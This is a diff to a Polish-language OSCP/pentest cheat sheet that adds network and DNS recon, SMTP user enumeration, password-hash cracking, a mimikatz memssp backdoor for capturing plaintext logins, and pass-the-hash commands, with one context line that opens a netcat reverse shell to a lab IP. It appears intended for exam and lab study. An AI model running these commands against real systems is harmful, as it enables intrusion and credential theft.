@@ -92,6 +92,19 @@ UDP (wolne — celuj w konkretne porty; SNMP/DNS/TFTP/IKE):
 sudo nmap -sU --top-ports 20 -oN nmap_udp.txt $IP
 ```
 
+**Wybór typu skanu:** `-sS` (SYN/half-open, domyślny gdy root — szybki, cichy) · `-sT` (connect, bez roota/przez proxy — wolniejszy, wpada w logi apki) · `-Pn` (host blokuje ICMP → traktuj jako up) · `-O --osscan-guess` (fingerprint OS ze stacku TCP/IP).
+
+**Sweep całej podsieci (greppable `-oG` → potok):**
+```bash
+nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt && grep Up ping-sweep.txt | cut -d" " -f2   # lista żywych
+nmap -p80,443 192.168.50.1-253 -oG web-sweep.txt && grep open web-sweep.txt | cut -d" " -f2  # kto ma web
+```
+**Netcat fallback (gdy brak nmapa na hoście):**
+```bash
+nc -nvv -w 1 -z $IP 3388-3390          # TCP: 'open' vs 'refused' (RST); -z zero-I/O, -w1 timeout
+nc -nv -u -z -w 1 $IP 120-123          # UDP: brak odpowiedzi=open, ICMP unreachable=closed
+```
+
 Kategorie skryptów NSE (świetne do enumeracji):
 ```bash
 nmap -p445 --script smb-enum-shares $IP           # które share dają RW
@@ -142,6 +155,30 @@ dnsrecon -d $DOMAIN -t std                          # standard
 dnsrecon -d $DOMAIN -D ~/wordlist.txt -t brt        # brute subdomen
 # Strefowy transfer (jackpot, jeśli zadziała):
 dig axfr @$IP $DOMAIN
+# Lekko/ręcznie:
+host -t mx $DOMAIN; host -t txt $DOMAIN              # MX (niższy numer=wyższy priorytet), TXT (tokeny/hinty)
+for n in $(cat list.txt); do host $n.$DOMAIN; done | grep -v "not found"   # forward brute
+gobuster dns -d $DOMAIN -w wordlist.txt -t 10        # (gobuster >3.6: --do zamiast -d)
+```
+> Forward-brute daje rozrzucone IP w tym zakresie → potem reverse-PTR sweep tego /24 = kolejne nazwane hosty (rekon jest **cykliczny**).
+
+## 1.4b Pasywny OSINT (zanim dotkniesz celu)
+> ⚠️ Na egzaminie OSCP faza pasywna prawie się nie liczy (brak internetowego OSINT) — na realnym teście jednak seeduje userów/maile i netbloki.
+```bash
+whois $DOMAIN -h <whois_ip>            # Registrant/Admin: name+org+phone+email + Name Servery
+whois $IP -h <whois_ip>                # reverse → ISP/CIDR (kolejne cele skanów)
+```
+> **Google dorks:** `site:cel.com filetype:txt` · `intitle:"index of"` · `site:cel.com inurl:admin` · `site:cel.com "username" "password"` · `site:cel.com -www` (subdomeny). **Third-party (niski footprint):** Netcraft/Wappalyzer (stack), Shodan (`hostname:cel.com` → banner+CVE), securityheaders.com, ssllabs.com. **Sekrety w repo:** `gitleaks detect --source <repo>`, `gitrob <org>` (regex+entropia; zwykle potrzeba PAT).
+
+## 1.4c Windows LOLBAS recon (assumed breach — bez Kali, bez internetu)
+> Na zablokowanym hoście AD robisz DNS + skan portów **wbudowanym Windowsem**. Kluczowe egzaminacyjnie.
+```powershell
+nslookup mail.corp.com                                 # A; -type=TXT/MX <host> <dns-server>
+Test-NetConnection -Port 445 192.168.50.151            # TcpTestSucceeded:True = open (ICMP+1 port)
+1..1024 | % { echo ((New-Object Net.Sockets.TcpClient).Connect("10.10.10.5",$_)) "port $_ open" } 2>$null   # lekki skan portów
+```
+```cmd
+net view \\dc01 /all                                   :: share'y (ADMIN$/C$/IPC$) + komentarze
 ```
 
 ## 1.5 SMB / NetBIOS (porty 139, 445)
@@ -190,6 +227,14 @@ Wycinanie userów z outputu enumdomusers (`[nazwa]` → users.txt):
 awk -F'[][]' '{print $2}' rpc_wynik.txt > users.txt
 # -F'[][]' ustawia [ oraz ] jako separatory | print $2 = to co między pierwszym [ a ]
 ```
+
+## 1.5b SMTP (port 25) — enum userów
+```bash
+nc -nv $IP 25                          # po połączeniu:
+VRFY root                              # 252 = akceptowany/prawdopodobny · 550 = unknown (skryptuj po userliście)
+# EXPN <lista> = członkowie listy mailingowej; Windows bez Kali: dism /online /Enable-Feature /FeatureName:TelnetClient → telnet $IP 25
+```
+> `252` nie potwierdza usera w 100% (serwer bywa „accept-and-attempt"), ale zawęża listę do sprayingu/phishingu.
 
 ## 1.6 SNMP (port 161/UDP)
 
@@ -1233,13 +1278,27 @@ hashcat --example-hashes | grep -iA2 "ntlm"             # gdy nie znasz numeru -
 
 ### Ekstrakcja hasha z pliku (`*2john`)
 ```bash
-ssh2john id_rsa > ssh.hash             # zaszyfrowany klucz prywatny SSH → hash
-keepass2john Database.kdbx > kp.hash   # baza KeePass → hash
+ssh2john id_rsa | sed 's/^[^:]*://' > ssh.hash    # ZDEJMIJ prefiks 'id_rsa:' — inaczej hashcat nie ładuje/łamie śmieci!
+keepass2john Database.kdbx | sed 's/^[^:]*://' > kp.hash   # to samo: usuwa prefiks 'Database:'
 zip2john plik.zip > zip.hash           # (analogicznie: office2john, gpg2john, pdf2john)
-hashcat -m 22921 ssh.hash /usr/share/wordlists/rockyou.txt -r ssh.rule   # klucz SSH
 hashcat -m 13400 kp.hash  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule   # KeePass
+# Znajdź bazy KeePass na Windows (bywa kilka — personal + dział):
+#   Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+```
+> ⚠️ **Cichy killer:** `*2john` dokleja `nazwapliku:` (jako „username") na początku — obejrzyj hash gołym okiem, wytnij wszystko do pierwszego `:`. **Klucz SSH:** `-m 22921` działa TYLKO dla `$6$`/SHA-512; nowoczesny **aes-256-ctr → "Token length exception"** → fallback do Johna:
+```bash
+ssh2john id_rsa > ssh.hash
+john --wordlist=rockyou.txt ssh.hash && john --show ssh.hash    # John ogarnia aes-256-ctr; chmod 600 id_rsa przed użyciem klucza
 ```
 > Dodatkowe tryby `-m`: **13400** KeePass · **22921** klucz SSH · **11600** 7-Zip · **13600** ZIP · **9600** Office 2013+ · **7500** Kerberos AS-REQ (etype 23).
+
+**Reguły hashcat pod znaną politykę** (z `note.txt` znasz wzorzec → zbuduj regułę ręcznie — często jedyna droga):
+```bash
+echo '$1' > demo.rule                              # składnia: $X dopisz na końcu · ^X na początku · c Kapitalizuj · l/u lower/upper · r odwróć
+hashcat -r demo.rule --stdout wordlist.txt         # DEBUG: pokaż kandydatów bez łamania (weryfikacja reguły)
+hashcat -m 0 hash.txt rockyou.txt -r demo.rule --force
+```
+> Wiele funkcji w jednej linii = łączone: `$1 c $!` → `Password1!`. Każda linia = osobna mutacja. Ludzki nawyk: Kapitał na początku, cyfry, special na końcu (`! @ #`). Escape w shellu: `echo \$1`.
 
 ### Password spraying (1 hasło × wielu userów)
 > **Najpierw sprawdź politykę lockout**, policz bezpieczną liczbę prób:
@@ -1285,11 +1344,16 @@ sekurlsa::ekeys
 ```
 lsadump::dcsync /domain:za.tryhackme.com /user:Administrator
 ```
-### memssp (SSP backdoor — zapis plaintext haseł przy logowaniu)
+### memssp (SSP backdoor — plaintext przy logowaniu; obejście Credential Guard)
 ```
 privilege::debug
 misc::memssp
 ```
+```powershell
+Get-ComputerInfo | Select DeviceGuardSecurityServicesRunning   # zawiera 'CredentialGuard' = LSASS chroniony
+type C:\Windows\System32\mimilsa.log                            # plaintext creds po memssp + NASTĘPNYM logowaniu
+```
+> **Credential Guard** blokuje zrzut LSASS (`sekurlsa` pokazuje tylko „LSA Isolated Data") — ale chroni TYLKO konta **domenowe**; lokalne z SAM (`lsadump::sam`) zrzucasz normalnie. `memssp` wstrzykuje SSP (bez DLL na dysku) i łapie plaintext przy **kolejnym** logowaniu (poczekaj / wymuś RDP). OPSEC: `mimilsa.log` to plaintext na dysku — posprzątaj.
 
 ### secretsdump (Linux/impacket — alternatywa bez wchodzenia na hosta)
 ```bash
@@ -1829,13 +1893,15 @@ mimikatz
 token::revert
 sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe 10.150.74.13 4444"
 ```
-Z Linuxa:
+Z Linuxa (format `-hashes LM:NT` — LM wypełnij 32 zerami gdy masz tylko NT):
 ```bash
 xfreerdp /v:$IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
-impacket-psexec -hashes :NTLM_HASH DOMAIN/MyUser@$IP
+impacket-wmiexec -hashes :NTLM_HASH Administrator@$IP    # ciszej niż psexec (bez usługi/pliku, shell jako user)
+impacket-psexec  -hashes :NTLM_HASH DOMAIN/MyUser@$IP    # głośny: usługa + exe na ADMIN$, ale shell SYSTEM
 evil-winrm -i $IP -u MyUser -H NTLM_HASH
-crackmapexec smb $IP -u MyUser -H NTLM_HASH
+smbclient \\\\$IP\\secrets -U Administrator --pw-nt-hash <NThash>   # samo CZYTANIE share'a NT hashem
 ```
+> ⚠️ **Dlaczego PtH nie działa (90% przypadków):** **UAC remote restrictions** (default od Visty) blokują zwykłych local-adminów zdalnie — niezawodnie do code-exec działa tylko **wbudowany Administrator (RID 500)**. Konta domenowe działają zawsze (`CORP/Administrator@IP`). Ten sam local-admin password bywa **współdzielony** między hostami → hash z jednego otwiera resztę.
 
 ### Overpass-the-Hash (hash NTLM → bilet Kerberos)
 > Gdy cel wymusza **Kerberos** (PsExec/usługa po nazwie hosta, nie po IP), a masz tylko hash NTLM. Zamień hash na TGT i uwierzytelniaj się Kerberosem. Wymaga admina lokalnie (odczyt LSASS).
